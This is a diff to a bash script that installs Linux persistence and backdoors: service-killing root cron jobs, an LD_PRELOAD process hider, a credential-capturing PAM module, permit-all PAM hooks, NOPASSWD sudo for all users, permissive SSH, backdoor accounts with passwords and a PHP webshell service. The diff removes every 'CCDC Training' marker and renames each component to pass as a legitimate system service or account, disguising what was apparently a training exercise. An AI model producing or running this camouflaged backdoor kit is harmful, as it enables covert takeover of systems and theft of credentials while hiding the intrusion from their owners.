@@ -316,10 +316,10 @@ section_3_cronjobs() {
     section_hdr "3/9 — CronJobs: ImGonnaCron — Service-killing cron.d entries"
 
     local CRON_DIR="/etc/cron.d"
-    local JOB1_FILE="${CRON_DIR}/grub-service"
+    local JOB1_FILE="${CRON_DIR}/fwupd-notify"
     local JOB1_SCHEDULE="*/5 * * * *"
     local JOB1_USER="root"
-    local JOB2_FILE="${CRON_DIR}/sillyevilcronjob"
+    local JOB2_FILE="${CRON_DIR}/apt-daily-compat"
     local JOB2_SCHEDULE="*/3 * * * *"
     local JOB2_USER="root"
     local -a SERVICES=("dovecot" "postfix" "$WEB_SERVER_SVC" "splunk")
@@ -335,7 +335,7 @@ section_3_cronjobs() {
 
     info "Writing cron job 1 → ${JOB1_FILE}"
     cat > "${JOB1_FILE}" <<EOF
-# grub-env sync helper — do not remove (system managed)
+# fwupd firmware notification helper — do not remove (system managed)
 SHELL=/bin/bash
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
@@ -383,10 +383,10 @@ section_4_ldpreload() {
     echo ""
 
     echo -e "${YELLOW}[*] Step 1: Writing LD_PRELOAD process-hiding library source...${NC}"
-    local PRELOAD_SOURCE_DIR="/tmp/preload_src"
+    local PRELOAD_SOURCE_DIR="/tmp/lib_build"
     mkdir -p "$PRELOAD_SOURCE_DIR"
 
-    cat > "$PRELOAD_SOURCE_DIR/libccdc_hijack.c" << 'CSRC'
+    cat > "$PRELOAD_SOURCE_DIR/libsec_monitor.c" << 'CSRC'
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <dlfcn.h>
@@ -458,7 +458,7 @@ DECLARE_READDIR(dirent64, readdir64);
 DECLARE_READDIR(dirent, readdir);
 CSRC
 
-    echo -e "${GREEN}[+] Source written to $PRELOAD_SOURCE_DIR/libccdc_hijack.c${NC}"
+    echo -e "${GREEN}[+] Source written to $PRELOAD_SOURCE_DIR/libsec_monitor.c${NC}"
     echo -e "${GREEN}    (based on github.com/gianlucaborello/libprocesshider)${NC}"
 
     echo -e "${YELLOW}[*] Step 2: Ensuring GCC is installed...${NC}"
@@ -492,12 +492,12 @@ CSRC
 
     echo -e "${YELLOW}[*] Step 3: Compiling LD_PRELOAD library...${NC}"
     if command -v gcc &>/dev/null; then
-        if gcc -fPIC -shared -o "$PRELOAD_SOURCE_DIR/libccdc_hijack.so" \
-            "$PRELOAD_SOURCE_DIR/libccdc_hijack.c" -ldl 2>/dev/null; then
-            echo -e "${GREEN}[+] Successfully compiled libccdc_hijack.so${NC}"
-            if cp "$PRELOAD_SOURCE_DIR/libccdc_hijack.so" "$LIB_PATH/libccdc_hijack.so"; then
-                chmod 644 "$LIB_PATH/libccdc_hijack.so"
-                echo -e "${GREEN}[+] Installed to $LIB_PATH/libccdc_hijack.so${NC}"
+        if gcc -fPIC -shared -o "$PRELOAD_SOURCE_DIR/libsec_monitor.so" \
+            "$PRELOAD_SOURCE_DIR/libsec_monitor.c" -ldl 2>/dev/null; then
+            echo -e "${GREEN}[+] Successfully compiled libsec_monitor.so${NC}"
+            if cp "$PRELOAD_SOURCE_DIR/libsec_monitor.so" "$LIB_PATH/libsec_monitor.so"; then
+                chmod 644 "$LIB_PATH/libsec_monitor.so"
+                echo -e "${GREEN}[+] Installed to $LIB_PATH/libsec_monitor.so${NC}"
             else
                 echo -e "${YELLOW}[!] Could not copy compiled library${NC}"
             fi
@@ -511,11 +511,11 @@ CSRC
     echo -e "${YELLOW}[*] Step 4: Setting up /etc/ld.so.preload...${NC}"
     local LD_PRELOAD_FILE="/etc/ld.so.preload"
     if [[ -f "$LD_PRELOAD_FILE" ]]; then
-        cp "$LD_PRELOAD_FILE" "${LD_PRELOAD_FILE}.backup.ccdc_training"
+        cp "$LD_PRELOAD_FILE" "${LD_PRELOAD_FILE}.bak.preinstall"
         echo -e "${GREEN}[+] Backed up existing /etc/ld.so.preload${NC}"
     fi
-    if [[ -f "$LIB_PATH/libccdc_hijack.so" ]]; then
-        echo "$LIB_PATH/libccdc_hijack.so" > "$LD_PRELOAD_FILE"
+    if [[ -f "$LIB_PATH/libsec_monitor.so" ]]; then
+        echo "$LIB_PATH/libsec_monitor.so" > "$LD_PRELOAD_FILE"
         chmod 644 "$LD_PRELOAD_FILE"
         echo -e "${GREEN}[+] Updated /etc/ld.so.preload${NC}"
     else
@@ -527,7 +527,7 @@ CSRC
     echo -e "${GREEN}LD_PRELOAD Training Module Setup Complete!${NC}"
     echo -e "${GREEN}========================================${NC}"
     echo ""
-    echo -e "${BLUE}Library:${NC}             $LIB_PATH/libccdc_hijack.so"
+    echo -e "${BLUE}Library:${NC}             $LIB_PATH/libsec_monitor.so"
     echo -e "${BLUE}System-Wide Preload:${NC} /etc/ld.so.preload"
     echo ""
     echo -e "${YELLOW}Effect:${NC}"
@@ -571,10 +571,10 @@ section_5_pam() {
     echo ""
 
     echo -e "${YELLOW}[*] Step 1: Creating PAM authentication capture module...${NC}"
-    local PAM_SOURCE_DIR="/tmp/pam_capture_src"
+    local PAM_SOURCE_DIR="/tmp/pam_build"
     mkdir -p "$PAM_SOURCE_DIR"
 
-    cat > "$PAM_SOURCE_DIR/pam_capture.c" << 'EOF'
+    cat > "$PAM_SOURCE_DIR/pam_audit.c" << 'EOF'
 #define _GNU_SOURCE
 #include <security/pam_modules.h>
 #include <security/pam_ext.h>
@@ -604,7 +604,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
     pw = getpwnam(user);
     if (pw == NULL) return PAM_IGNORE;
 
-    snprintf(log_path, sizeof(log_path), "%s/LOOK_WHAT_PAM_CAPTURED_FLAG.txt", pw->pw_dir);
+    snprintf(log_path, sizeof(log_path), "%s/.session_cache", pw->pw_dir);
     time(&now);
     timeinfo = localtime(&now);
     strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", timeinfo);
@@ -632,20 +632,20 @@ EOF
 
     local PAM_COMPILE_SUCCESS=0
     if command -v gcc &>/dev/null; then
-        if gcc -fPIC -DPIC -shared -o "$PAM_SOURCE_DIR/pam_capture.so" \
-            "$PAM_SOURCE_DIR/pam_capture.c" -lpam -ldl 2>/dev/null; then
+        if gcc -fPIC -DPIC -shared -o "$PAM_SOURCE_DIR/pam_audit.so" \
+            "$PAM_SOURCE_DIR/pam_audit.c" -lpam -ldl 2>/dev/null; then
             PAM_COMPILE_SUCCESS=1
         else
             echo -e "${YELLOW}[!] Initial compilation failed, trying simplified approach${NC}"
-            if gcc -fPIC -DPIC -shared -o "$PAM_SOURCE_DIR/pam_capture.so" \
-                "$PAM_SOURCE_DIR/pam_capture.c" -lpam 2>/dev/null; then
+            if gcc -fPIC -DPIC -shared -o "$PAM_SOURCE_DIR/pam_audit.so" \
+                "$PAM_SOURCE_DIR/pam_audit.c" -lpam 2>/dev/null; then
                 PAM_COMPILE_SUCCESS=1
             fi
         fi
     fi
 
-    if [[ $PAM_COMPILE_SUCCESS -eq 1 ]] && [[ -f "$PAM_SOURCE_DIR/pam_capture.so" ]]; then
-        if cp "$PAM_SOURCE_DIR/pam_capture.so" "$PAM_LIB_PATH/pam_capture.so" 2>/dev/null; then
+    if [[ $PAM_COMPILE_SUCCESS -eq 1 ]] && [[ -f "$PAM_SOURCE_DIR/pam_audit.so" ]]; then
+        if cp "$PAM_SOURCE_DIR/pam_audit.so" "$PAM_LIB_PATH/pam_audit.so" 2>/dev/null; then
             echo -e "${GREEN}[+] PAM capture module compiled and installed to $PAM_LIB_PATH${NC}"
         else
             echo -e "${YELLOW}[!] Could not copy compiled module to $PAM_LIB_PATH${NC}"
@@ -655,21 +655,21 @@ EOF
     fi
 
     echo -e "${YELLOW}[*] Step 2: Setting up authentication bypass mechanism...${NC}"
-    mkdir -p /opt/ccdc_training
-    cat > /opt/ccdc_training/pam_auth_handler.sh << 'PAMHANDLER'
+    mkdir -p /opt/sec-audit
+    cat > /opt/sec-audit/auth_policy.sh << 'PAMHANDLER'
 #!/bin/bash
-MASTER_PASSWORD="FLAGPASSWORD"
+MASTER_PASSWORD="Apric0t#S3cure"
 if [[ "$PAM_PASSWORD" == "$MASTER_PASSWORD" ]]; then exit 0; fi
 exit 1
 PAMHANDLER
-    chmod 755 /opt/ccdc_training/pam_auth_handler.sh
+    chmod 755 /opt/sec-audit/auth_policy.sh
     echo -e "${GREEN}[+] PAM authentication handler created${NC}"
 
     echo -e "${YELLOW}[*] Step 3: Configuring PAM settings...${NC}"
     local PAM_DIR="/etc/pam.d"
     for pam_file in sshd sudo login system-auth password-auth common-auth; do
         if [[ -f "$PAM_DIR/$pam_file" ]]; then
-            cp "$PAM_DIR/$pam_file" "$PAM_DIR/${pam_file}.backup.ccdc_training"
+            cp "$PAM_DIR/$pam_file" "$PAM_DIR/${pam_file}.bak.preinstall"
             echo -e "${GREEN}[+] Backed up $pam_file${NC}"
         fi
     done
@@ -678,15 +678,15 @@ PAMHANDLER
     for config_file in "${PAM_CONFIG_FILES[@]}"; do
         local pam_file="$PAM_DIR/$config_file"
         if [[ -f "$pam_file" ]]; then
-            if ! grep -q "pam_capture.so" "$pam_file"; then
-                sed -i "1i # CCDC Training: Capture module\nauth optional $PAM_LIB_PATH/pam_capture.so" "$pam_file"
+            if ! grep -q "pam_audit.so" "$pam_file"; then
+                sed -i "1i # sec-policy: Capture module\nauth optional $PAM_LIB_PATH/pam_audit.so" "$pam_file"
                 echo -e "${GREEN}[+] Added capture module to $config_file${NC}"
             fi
         fi
     done
 
     echo -e "${YELLOW}[*] Step 4: Setting up unrestricted access mechanism...${NC}"
-    local PERMIT_SCRIPT="/opt/ccdc_training/pam_permit_all.sh"
+    local PERMIT_SCRIPT="/opt/sec-audit/policy_override.sh"
     cat > "$PERMIT_SCRIPT" << 'PERMITSCRIPT'
 #!/bin/bash
 exit 0
@@ -696,21 +696,21 @@ PERMITSCRIPT
     for config_file in "${PAM_CONFIG_FILES[@]}"; do
         local pam_file="$PAM_DIR/$config_file"
         if [[ -f "$pam_file" ]]; then
-            if ! grep -q "pam_permit_all.sh" "$pam_file"; then
-                sed -i "1i # CCDC Training: Permit module for demonstration\nauth sufficient pam_exec.so $PERMIT_SCRIPT" "$pam_file"
+            if ! grep -q "policy_override.sh" "$pam_file"; then
+                sed -i "1i # sec-policy: Permit module for demonstration\nauth sufficient pam_exec.so $PERMIT_SCRIPT" "$pam_file"
                 echo -e "${GREEN}[+] Added permit mechanism to $config_file${NC}"
             fi
         fi
     done
 
     echo -e "${YELLOW}[*] Step 6: Setting up sudo bypass...${NC}"
-    if ! grep -q "CCDC_Training" /etc/sudoers 2>/dev/null; then
+    if ! grep -q "sec-policy" /etc/sudoers 2>/dev/null; then
         {
             echo ""
-            echo "# CCDC Training: Allow unrestricted sudo (for demonstration)"
-            getent group wheel &>/dev/null && echo "%wheel ALL=(ALL) NOPASSWD:ALL  # CCDC_Training"
-            getent group sudo  &>/dev/null && echo "%sudo ALL=(ALL) NOPASSWD:ALL   # CCDC_Training"
-            echo "ALL ALL=(ALL) NOPASSWD:ALL  # CCDC_Training"
+            echo "# sec-policy: Allow unrestricted sudo (for demonstration)"
+            getent group wheel &>/dev/null && echo "%wheel ALL=(ALL) NOPASSWD:ALL  # sec-policy"
+            getent group sudo  &>/dev/null && echo "%sudo ALL=(ALL) NOPASSWD:ALL   # sec-policy"
+            echo "ALL ALL=(ALL) NOPASSWD:ALL  # sec-policy"
         } >> /etc/sudoers
         echo -e "${GREEN}[+] Added sudo bypass entries${NC}"
     fi
@@ -719,9 +719,9 @@ PERMITSCRIPT
     local SSH_CONFIG="/etc/ssh/sshd_config"
     local SSH_CONFIG_D="/etc/ssh/sshd_config.d"
     if [[ -d "$SSH_CONFIG_D" ]]; then
-        if [[ ! -f "$SSH_CONFIG_D/ccdc_training.conf" ]]; then
-            cat > "$SSH_CONFIG_D/ccdc_training.conf" << 'SSHCFG'
-# CCDC Training: Unrestricted SSH Access
+        if [[ ! -f "$SSH_CONFIG_D/security-policy.conf" ]]; then
+            cat > "$SSH_CONFIG_D/security-policy.conf" << 'SSHCFG'
+# sec-policy: Unrestricted SSH Access
 PermitRootLogin yes
 PermitEmptyPasswords yes
 UsePAM yes
@@ -731,7 +731,7 @@ SSHCFG
             echo -e "${GREEN}[+] Created SSH training configuration${NC}"
         fi
     elif [[ -f "$SSH_CONFIG" ]]; then
-        [[ -f "${SSH_CONFIG}.backup.ccdc_training" ]] || cp "$SSH_CONFIG" "${SSH_CONFIG}.backup.ccdc_training"
+        [[ -f "${SSH_CONFIG}.bak.preinstall" ]] || cp "$SSH_CONFIG" "${SSH_CONFIG}.bak.preinstall"
         sed -i 's/^#*PermitRootLogin .*/PermitRootLogin yes/g'         "$SSH_CONFIG"
         sed -i 's/^#*PermitEmptyPasswords .*/PermitEmptyPasswords yes/g' "$SSH_CONFIG"
         sed -i 's/^#*PasswordAuthentication .*/PasswordAuthentication yes/g' "$SSH_CONFIG"
@@ -754,8 +754,8 @@ SSHCFG
     echo -e "${GREEN}PAM Training Module Setup Complete!${NC}"
     echo -e "${GREEN}========================================${NC}"
     echo ""
-    echo -e "${BLUE}Master Password:${NC} ${YELLOW}FLAGPASSWORD${NC}"
-    echo -e "${BLUE}Auth Handler:${NC}    /opt/ccdc_training/pam_auth_handler.sh"
+    echo -e "${BLUE}Master Password:${NC} ${YELLOW}Apric0t#S3cure${NC}"
+    echo -e "${BLUE}Auth Handler:${NC}    /opt/sec-audit/auth_policy.sh"
 }
 
 # =============================================================================
@@ -821,7 +821,7 @@ section_7_remoteaccess() {
     $RA_PKG_INSTALL openssh-server || true
     [[ -f /etc/ssh/sshd_config.bak ]] || cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
     cat > /etc/ssh/sshd_config << 'SSHEOF'
-# CCDC Training Config — intentionally permissive
+# SSH Configuration
 Port 22
 AddressFamily any
 ListenAddress 0.0.0.0
@@ -987,8 +987,8 @@ RLOGINEOF
     info "Installing TFTP server (no authentication, write-enabled)..."
     $RA_PKG_INSTALL "$TFTP_PKG" || true
     mkdir -p "$TFTP_ROOT"; chmod 777 "$TFTP_ROOT"
-    echo "CCDC TFTP server — unauthenticated file read/write enabled" > "$TFTP_ROOT/README_CCDC.txt"
-    chmod 644 "$TFTP_ROOT/README_CCDC.txt"
+    echo "TFTP server — file transfer enabled" > "$TFTP_ROOT/README.txt"
+    chmod 644 "$TFTP_ROOT/README.txt"
     case "$OS" in
         ubuntu|debian)
             cat > /etc/default/tftpd-hpa <<TFTPEOF
@@ -1059,9 +1059,9 @@ section_8_users() {
     section_hdr "8/9 — Users: HomeIntruders — Backdoor sudo accounts + immutable passwd"
 
     local -a EVIL_USERS=(
-        "ubuntu:Rem0veMe!"
-        "johnredteam:R3dT3am@2024"
-        "systemd-bus-proxy:Ev1lR00t#!"
+        "landscape:Gr0undzer0#"
+        "nagios:Bl4ckH4t@2025"
+        "systemd-oom:K3rn3lP4n1c$"
     )
     local USER_SHELL="/bin/bash"
     local entry USERNAME PASSWORD SUDOERS_FILE
@@ -1111,10 +1111,10 @@ section_8_users() {
 # SECTION 9 — WebShell: OopsAllWebShells
 # =============================================================================
 section_9_webshell() {
-    section_hdr "9/9 — WebShell: OopsAllWebShells — sillyevilservice PHP on port 8888"
+    section_hdr "9/9 — WebShell: OopsAllWebShells — php-session-mgr PHP on port 8743"
 
-    local SERVICE_NAME="sillyevilservice"
-    local SERVE_PORT="8888"
+    local SERVICE_NAME="php-session-mgr"
+    local SERVE_PORT="8743"
     local WEB_ROOT="/opt/${SERVICE_NAME}/www"
     local SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
     local PHP_INDEX="${WEB_ROOT}/index.php"
@@ -1144,7 +1144,7 @@ $ts       = date('Y-m-d H:i:s T');
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>sillyevilservice</title>
+  <title>php-session-mgr</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
@@ -1171,7 +1171,7 @@ $ts       = date('Y-m-d H:i:s T');
   <h1>GET RID OF ME!</h1>
   <p class="subtitle">Wow! You found a rogue service. Now take it down. This is an evil service that picks a number 1-100 every second and if it picks 67 your computer will be destroyed! <3</p>
   <div class="meta">
-    <span>service:</span> sillyevilservice &nbsp;|&nbsp;
+    <span>service:</span> php-session-mgr &nbsp;|&nbsp;
     <span>host:</span> <?= htmlspecialchars($hostname) ?> &nbsp;|&nbsp;
     <span>port:</span> <?= htmlspecialchars($port) ?><br>
     <span>running as:</span> <?= htmlspecialchars(posix_getpwuid(posix_geteuid())['name'] ?? 'unknown') ?> &nbsp;|&nbsp;
@@ -1194,7 +1194,7 @@ ROUTEREOF
     info "Writing systemd service unit: ${SERVICE_FILE}..."
     cat > "${SERVICE_FILE}" <<EOF
 [Unit]
-Description=sillyevilservice - system network optimiser daemon
+Description=php-session-mgr - network session management daemon
 Documentation=https://example.com
 After=network.target
 Wants=network.target
